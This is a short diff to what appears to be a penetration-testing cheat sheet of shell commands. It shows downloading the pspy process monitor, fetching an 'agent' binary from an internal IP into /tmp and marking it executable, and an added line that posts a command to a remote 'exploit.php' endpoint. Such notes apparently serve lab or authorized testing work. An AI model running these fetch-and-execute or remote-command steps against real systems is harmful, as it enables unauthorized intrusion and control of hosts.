@@ -13,3 +13,7 @@ curl -L -O https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy6
 ```sh
 curl 10.250.180.3:8000/agent -o /tmp/agent && chmod +x /tmp/agent
 ```
+
+```sh
+curl -X POST http://IP/web/exploit.php -d "a=COMMAND"
+```
